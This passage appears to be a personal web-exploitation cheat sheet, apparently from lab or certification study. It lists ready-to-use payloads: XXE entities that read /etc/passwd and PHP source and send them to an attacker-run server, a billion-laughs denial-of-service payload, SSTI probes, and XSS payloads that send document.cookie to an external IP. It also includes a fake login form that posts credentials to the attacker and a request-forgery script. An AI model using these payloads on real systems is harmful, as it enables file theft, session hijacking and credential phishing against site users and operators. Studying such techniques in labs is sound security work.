- **Reflected File read**
  ```xml
  <!DOCTYPE foo [<!ENTITY hello SYSTEM "FILE"> ]>
  ```
  - ssh keys 
  - Windows hash stealing
  - If the sintax breaks the xml:
    ```bash
    echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
    httpserv
    ```

    In the request use the `CDATA` tag, reference the `&joined;` entity

    ```xml
    <!ENTITY % begin "<![CDATA["> 
    <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
    <!ENTITY % end "]]>">
    <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
    %xxe;
    ```
- **Error based File Read**
  1. Try to cause an error
     - delete any of the closing tags, 
     - change one of them, so it does not close
     - reference a non-existing entity
  2. Host a DTD file with the payload
     ```xml
     <!ENTITY % file SYSTEM "file:///etc/hosts">
     <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
     ```
     Defines the `file` parameter entity and joins it with a non-existing entity
  3. Request the DTD file referencing for `&nonExistingEntity;%file;`
     ```xml
     <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
     %remote;
     %error;
     ```
- **Blind File Read**
  - Out-of-band (OOB) Data Exfiltration
    send a web request to our web server with the content of the file
    1. Define file Entity, e.g. using php filter and define its content in another
       ```xml
       <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
       <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
       ```
    2. Host a DTD file with content:
       ```xml
       <?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE email [ 
         <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
         %remote;
         %oob;
       ]>
       <root>&content;</root>
       ```
    3. Send Request
  - [XXEinjector](https://github.com/enjoiz/XXEinjector)
    - Add after header XXEINJECT in the request:
      ```xml
      <?xml version="1.0" encoding="UTF-8"?>
      XXEINJECT
      ```
    - Inject:
      ```bash
      ruby XXEinjector.rb --host=[tun0 IP] --httpport=8888 --file=xxe.req --path=/etc/passwd --oob=http --phpfilter
      ```
    - See the results
      ```bash
      cat Logs/[IP]/[PATH].log
      ```
- **SSRF**
  enumerate open ports and access their pages, and restricted web pages
- **Denial of Service (DOS)**
  ```xml
  <!ENTITY a0 "DOS" >
    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
    <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
    <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
    <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
    <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
    <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
    <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
    <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
    <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">  
  ```
  This payload defines the `a0` entity as `DOS`, references it in `a1` multiple times, references `a1` in `a2`, and so on until the back-end server's memory runs out due to the self-reference loops. *No longer works with modern web servers.*



### SS Template Injection

**Template Engines** are used to display dynamically generated content on a web page. They replace the variables inside a template file with actual values and display these values to the client.

**Server-side template injection** is a vulnerability where the attacker injects malicious input into a template in order to execute commands on the server.

If an SSTI exists, after submitting one of these:

`{{7*7}}`
`${7*7}`
`<%= 7*7 %>`
`${{7*7}}`
`#{7*7}`

the web server will detect these expressions as valid code and attempt to execute them, in this instance calculating the mathematical equation 7*7, which is equal to 49.

An error message can indicate what is the engine used, one can then perform research on how to exploit the particular template.

Confirmation

- `<%'${{/#{@}}%>{{`
- `{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}[7*7]${{<%[%'"}}%\`
- Errors / Reflection → Check Template Documentation + Exploits

[Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

### HTTP Verb Tampering

Change the HTTP method into one that was not taken into account.

**Like `GET`**:

- `DELETE`
- `HEAD`

**Like `POST`**:

Add `Content-Type: application/x-www-form-urlencoded` and move the `param=value` at the bottom

- `PUT`
- `PATCH`

##### identify

- Show accepted methods

  ```bash
  curl -i -X OPTIONS [URL]
  ```

- Allows to:

  - Bypass blocked pages/ request
  - Bypass Injection filters


### IDOR

`Insecure Direct Object References (IDOR)` occur when a reference to an object is exposed and can be controlled to  access to other similar objects. E.g. if `download.php?file_id=123` allows you to download other files by changing the `id`.

- Fuzz
- Understand the encoding (is it done by the front-end?)


## Client-side

### Authentication

##### Type Juggling

PHP type juggling vulnerability occurs when a loose comparison operator  (== or!=) is used in the place of a strict comparison operator (===  or!==). 

E.g. the following php code handling an authentication is vulnerable:

```php
if (strcmp($username , $_POST['username']) == 0) {
	if (strcmp($password, $_POST['password']) == 0) {
```

To exploit it, one can change the POST data of the web request in an empty array, since If we convert those variables into empty arrays ( `$username[] & $password[]`), the comparison will return NULL , and NULL == 0 will return true, causing the login to be successful.

### XSS 

##### Generalities:

Cross-site scripting (XSS) allow an attacker to masquerade as a victim user

- **Types:**
  - [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) input is processed by the *backend* and displayed on the page
  - [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) (persistent or second-order XSS) input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)
  - [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) input is processed by the *frontend* and displayed on the page

- **Tools**

  - BeeXssHunter
  - `~/TOOLS/python xsstrike.py -u []`
  - Payloads: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS Injection/README.md), [PayloadBox](https://github.com/payloadbox/xss-payload-list)

##### Exploit

- **Check the Payload on yourself** (a sintax check to see if it valid javascript)

  ```html
  data:text/html,<script>prompt()</script>
  ```

- **Verify:**

  - Check all parameters (also header!)

  - Payloads Prefix: `'"></script></title></style></textarea>`

  - Reflected

    - Payload with `prompt(document.domain)` function

      ```html
      <script>prompt(document.domain)</script>
      <script/src="data:;base64,cHJvbXB0KGRvY3VtZW50LmRvbWFpbikK"></script>
      <svg/onload=eval(atob("cHJvbXB0KGRvY3VtZW50LmRvbWFpbikK"));>
      ```

  - Blind

    - Take the reflected payloads before, and replace `prompt(document.domain)` and its base64 encoded version with:

      ```javascript
      xhr=new XMLHttpRequest;xhr.open("GET","http://10.10.14.190:8888/");xhr.send();
      ```

    - Javascript payload in `evil.js` 

      ```bash
      <script src="http://10.10.14.190:8888/evil.js"></script>
      ```

  - Other payloads: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS Injection/README.md)

- **Login form Injection**

  1. Open a server

  2. Write a malicios login form using  `document.write('[CODE HERE]')`

     ```html
     <h3>Please login to continue</h3><form action=http://10.10.14.141:8888><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>
     ```

- **Cookie stealing**

  Steals cookies to hijack a logged-in session (If they have `HttpOnly: False`)

  ```javascript
  new Image().src="http://10.10.14.3:8888/?c="+btoa(document.cookie);
  ```

  ```javascript
  xhr=new XMLHttpRequest;xhr.open("GET","http://10.10.14.3:8888/?c="+btoa(document.cookie));xhr.send();
  ```

  It will output cookies in base64 (`;` is the splitting charachters for cookies

  1. Extension cookie editor
  2. Add (bottom left)
  3. Save & Refresh

  You can now FUZZ with `-H "Cookie:""`

- **Request Forgery**

  Perform a request on behalf of the victim user and get the response back to to you

  ```javascript
  function b(){sr=new XMLHttpRequest;sr.open("GET","http://10.10.14.3:8888/?c"+btoa(this.responseText));sr.send();};xhr=new XMLHttpRequest;xhr.open("[METHOD]","[URL]");xhr.withCredentials=true;xhr.onload=b;xhr.send();
  ```

  In the case of POST requests

  - You will need to add a Content-Type header, add this to the payload:

    ```bash
    xhr.setRequestHeader("Content-Type","[POST_DATA_TYPE]");
    ```

  - You will need to change `xhr.send()` to:

    ```bash
    xhr.send("[POST_DATA]");
    ```

  - In the case of JSON, adjust `xhr.send()` to:

    ```bash
    xhr.send(JSON.Stringify("[JSON_DATA]"));
    ```
